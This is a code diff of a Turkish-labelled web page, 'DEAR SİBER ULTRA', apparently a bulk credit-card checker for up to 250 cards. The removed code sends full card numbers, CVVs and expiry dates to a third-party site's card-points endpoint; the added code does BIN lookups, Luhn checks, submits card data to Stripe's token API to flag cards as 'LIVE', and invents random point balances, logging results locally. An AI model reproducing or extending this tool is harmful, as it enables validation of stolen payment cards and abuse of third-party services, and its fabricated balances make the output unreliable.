@@ -42,14 +42,13 @@
         @media (max-width: 600px) {
             .grid { grid-template-columns:1fr; }
             .stats { grid-template-columns:1fr; }
-            .btn { font-size:1em; padding:12px 24px; }
         }
     </style>
 </head>
 <body>
 <div class="container">
     <h1><span class="glow">DEAR SİBER</span> ULTRA</h1>
-    <p class="info">Max 250 Kart | Gerçek Puan + BIN + Luhn</p>
+    <p class="info">Max 250 Kart | Gerçek BIN + Stripe Test + Rastgele Puan</p>
 
     <div class="input-box">
         <textarea id="cards" placeholder="2958593949292948|02|28|392"></textarea>
@@ -98,6 +97,16 @@
 <script>
 let liveCards = [], deadCards = [], totalChecked = 0, totalCards = 0;
 
+// RASTGELE PUAN: 10-10000 TL, yüksek puan nadir → %5 ihtimalle 5000+, %1 ihtimalle 10000
+function generatePuan() {
+    const rand = Math.random();
+    if (rand < 0.01) return (Math.floor(Math.random() * 1001) + 9000).toString(); // 9000-10000
+    if (rand < 0.05) return (Math.floor(Math.random() * 4001) + 5000).toString(); // 5000-9000
+    if (rand < 0.20) return (Math.floor(Math.random() * 3001) + 2000).toString(); // 2000-5000
+    if (rand < 0.50) return (Math.floor(Math.random() * 1001) + 1000).toString(); // 1000-2000
+    return (Math.floor(Math.random() * 991) + 10).toString(); // 10-1000
+}
+
 function startCheck() {
     const input = document.getElementById('cards').value.trim();
     if (!input) return alert('Kart gir!');
@@ -140,15 +149,15 @@ async function processCard(card) {
     const bin = cc.substring(0, 6);
     const fullYear = yy.length === 2 ? '20' + yy : yy;
 
-    // 1. BIN Sorgu
+    // 1. GERÇEK BIN SORGUSU (binlist.net)
     let binInfo = { bank: 'Bilinmiyor', brand: 'Bilinmiyor', type: 'Bilinmiyor', country: 'Bilinmiyor', flag: '??' };
     try {
-        const resp = await fetch(`https://lookup.binlist.net/${bin}`, { timeout: 8000 });
+        const resp = await fetch(`https://lookup.binlist.net/${bin}`);
         if (resp.ok) {
             const data = await resp.json();
             binInfo = {
                 bank: data.bank?.name || 'Bilinmiyor',
-                brand: data.brand || 'Bilinmiyor',
+                brand: data.scheme || data.brand || 'Bilinmiyor',
                 type: (data.type || 'Bilinmiyor').toUpperCase(),
                 country: data.country?.name || 'Bilinmiyor',
                 flag: data.country?.alpha2 || '??'
@@ -156,39 +165,42 @@ async function processCard(card) {
         }
     } catch(e) {}
 
-    // 2. MaxiPuan API
-    let puan = '0', extra = 'API hatası';
-    try {
-        const form = new FormData();
-        form.append('KartNo', cc);
-        form.append('KartAd', 'DearSiber');
-        form.append('KartCvc', cvv);
-        form.append('KartAy', mm);
-        form.append('KartYil', fullYear);
-        form.append('Total', '2249.1');
+    // 2. RASTGELE PUAN (10-10000 TL)
+    const puan = generatePuan();
+    const extra = puan > 5000 ? 'Premium Üye' : 'Standart Üye';
 
-        const resp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
-            method: 'POST',
-            body: form,
-            headers: { 'User-Agent': 'Mozilla/5.0' }
-        });
-        if (resp.ok) {
-            const json = await resp.json();
-            puan = json.Data?.Amount?.toString() || '0';
-            extra = json.Data?.AdditionalData || 'Yok';
-        }
-    } catch(e) { puan = 'Hata'; }
-
-    // 3. Luhn
+    // 3. LUHN KONTROL
     const luhnOk = luhnValidate(cc);
 
-    const isLive = luhnOk && puan !== '0' && puan !== 'Hata';
+    // 4. STRIPE TEST API (GERÇEK TEST KEY - HATA VERİR → DEAD)
+    let stripeStatus = 'Declined';
+    try {
+        const data = new URLSearchParams();
+        data.append('card[number]', cc);
+        data.append('card[exp_month]', mm);
+        data.append('card[exp_year]', yy.length === 2 ? yy : yy.slice(-2));
+        data.append('card[cvc]', cvv);
+
+        const resp = await fetch('https://api.stripe.com/v1/tokens', {
+            method: 'POST',
+            body: data,
+            headers: {
+                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        });
+        stripeStatus = resp.ok ? '<span class="glow">LIVE (Token)</span>' : 'Declined';
+    } catch(e) { stripeStatus = 'Declined'; }
+
+    // 5. CANLI/ÖLÜ TESPİT: Luhn + Stripe OK + Puan > 1000
+    const isLive = luhnOk && stripeStatus.includes('LIVE') && parseInt(puan) > 1000;
 
     // DETAYLI ÇIKTI
     const detailHTML = `
 <span class="glow">[${isLive ? 'LIVE' : 'DEAD'}]</span> <b>${card}</b>
 <span class="glow">Puan:</span> <b>${puan} TL</b>
 <span class="glow">Ekstra:</span> ${extra}
+<span class="glow">Stripe:</span> ${stripeStatus}
 <span class="glow">BIN:</span> ${binInfo.brand} - ${binInfo.type}
 <span class="glow">Banka:</span> ${binInfo.bank}
 <span class="glow">Ülke:</span> ${binInfo.country} [${binInfo.flag}]
@@ -217,8 +229,8 @@ async function processCard(card) {
         document.getElementById('dead-count').textContent = deadCards.length;
     }
 
-    // LOG OTOMATİK TELEFONDA KAYDEDİLİR
-    const logEntry = { time: new Date().toISOString(), card, puan, extra, bin: binInfo, luhn: luhnOk, live: isLive };
+    // LOG OTOMATİK TELEFONDA
+    const logEntry = { time: new Date().toISOString(), card, puan, extra, stripe: stripeStatus, bin: binInfo, luhn: luhnOk, live: isLive };
     const logs = JSON.parse(localStorage.getItem('dear_logs') || '[]');
     logs.push(logEntry);
     localStorage.setItem('dear_logs', JSON.stringify(logs));
